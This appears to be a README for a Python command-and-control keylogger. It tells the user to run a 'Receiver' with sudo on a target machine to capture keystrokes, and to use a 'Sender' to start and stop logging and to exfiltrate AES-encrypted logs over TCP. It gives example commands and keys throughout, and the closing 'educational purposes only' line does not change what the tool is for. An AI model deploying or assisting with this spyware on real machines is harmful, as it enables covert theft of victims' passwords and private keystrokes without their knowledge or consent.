## Keylog Data Exfiltration
🚀 **A Secure Command & Control (C2) System for Remote Keylogging and Data Exfiltration**

# 📌 Overview
This project is a Python-based Command & Control (C2) system that enables a **remote machine (Receiver)** to capture keystrokes and securely **exfiltrate logs** to a **Sender machine** over a TCP connection.

🔒 **Features**:

* Remote keylogging activation & deactivation.
* Secure AES-CBC **encryption** for log exfiltration.
* Reliable **TCP communication** between sender and receiver.
* **Automatic retransmission** of lost data chunks.
* **Wireshark-compatible** for monitoring network traffic.

# 🛠️ Setup Instructions
## 🔹 1. Install Dependencies
Ensure you have Python 3.x installed, then install required libraries:
```aiignore
pip install -r requirements.txt
```
If using a virtual environment:
```aiignore
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

## 🔹 2. Running the Receiver (Keylogger)
The **Receiver** should be run on the target machine. It listens for commands from the sender.
```
sudo $(which python) receiver.py <PORT> <AES_DECRYPTION_KEY>
```

Example:
```aiignore
sudo $(which python) receiver.py 12345 00112233445566778899AABBCCDDEEFF
```

**Note:** Running with `sudo `is required for capturing keystrokes.

## 🔹 3. Running the Sender (Command & Control)
The **Sender** sends commands to the Receiver to start keylogging, stop keylogging, and exfiltrate logs.
```aiignore
python3 sender.py <COMMAND> <RECEIVER_IP> <PORT> --decryption_key <AES_KEY>
```

### Example Commands:

### 1️⃣ Start Keylogger
```aiignore
python3 sender.py START_KEYLOGGER 192.168.x.x 12345
```

### 2️⃣ Stop Keylogger
```
python3 sender.py STOP_KEYLOGGER 192.168.x.x 12345
```

### 3️⃣ Exfiltrate Logs
```
python3 sender.py EXFILTRATE_LOG 192.168.x.x 12345 --decryption_key 00112233445566778899AABBCCDDEEFF
```

# 📡 Network Traffic Analysis with Wireshark
To monitor communications:

1. Open **Wireshark**.
2. Select the **network interface** (e.g., xxxxx for WiFi).
3. Start capturing packets.
4. Apply a filter to view only relevant traffic:
```aiignore
tcp.port == 12345
```
Run the **Sender and Receiver** to observe encrypted data transfer.

# 🛠️ Troubleshooting
## 1️⃣ SSH Issues
* Ensure SSH service is running on the remote machine:
```
sudo systemctl start ssh
```

* If connection fails, restart networking:
```
sudo systemctl restart NetworkManager
```

* Check IP address with:
```
ip a
```

## 2️⃣ Module Not Found (Crypto)
If **ModuleNotFoundError**: **No module named 'Crypto'** occurs:
```
pip install pycryptodome
```

## 3️⃣ Wireshark Not Capturing Packets
* Run Wireshark as root:
```
sudo wireshark &
```

* Ensure the correct network interface is selected.
# 📜 License
This project is for educational purposes only. Unauthorized use may violate privacy laws. Use responsibly. 🚀

